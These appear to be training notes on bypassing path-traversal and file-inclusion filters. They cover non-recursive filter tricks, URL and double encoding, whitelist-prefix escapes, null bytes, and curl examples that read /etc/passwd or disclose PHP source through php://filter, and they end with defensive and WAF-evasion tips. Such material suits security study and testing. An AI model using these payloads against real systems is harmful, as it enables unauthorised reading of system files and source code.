# Basic Bypasses

## Key Takeaways

- **Non-Recursive Path Traversal Filters**
  - Filters that only block `../` once can be bypassed.
  - Common bypasses:  
    - `....//`  
    - `..././`  
    - `....\/`
  - Shows why filters must be *recursive*.

- **Encoding**
  - Useful when characters like `.`, `/` are blocked.
  - Techniques:  
    - URL encoding: `%2e%2e%2f`  
    - Double URL encoding  
  - Servers may decode input multiple times - bypass.

- **Approved Paths**
  - Some apps require paths to start with a whitelist prefix.
  - Bypass by *starting with the approved path*, then traversing out:
    ```
    /var/www/html/../../../../etc/passwd
    ```

- **Appended Extension**
  - Apps may append `.php` or similar.
  - Old bypass techniques (mostly obsolete today):
    - **Path truncation** using long strings.
    - **Null byte injection** with `%00`.

---

## Code Examples

### Non-Recursive Traversal Bypass

```bash
curl "http://example.com/?file=....//etc/passwd"
```

### Encoding Bypass

```bash
curl "http://example.com/?file=%2e%2e%2fetc/passwd"
```

### PHP Wrappers (Source Disclosure)

```bash
curl "http://example.com/?file=php://filter/convert.base64-encode/resource=index.php"
```

---

### Mitigation

- Real apps often stack multiple filters: combine bypasses.
- Complex regex filters may introduce edge-case bypasses.
- WAF bypass: use encoding, obfuscation, mixed traversal characters.
- Modern PHP has patched many legacy truncation/null-byte issues.
- Defense in depth is essential:
  - Input validation
  - Least privilege filesystem permissions
  - Regular audits and fuzz testing
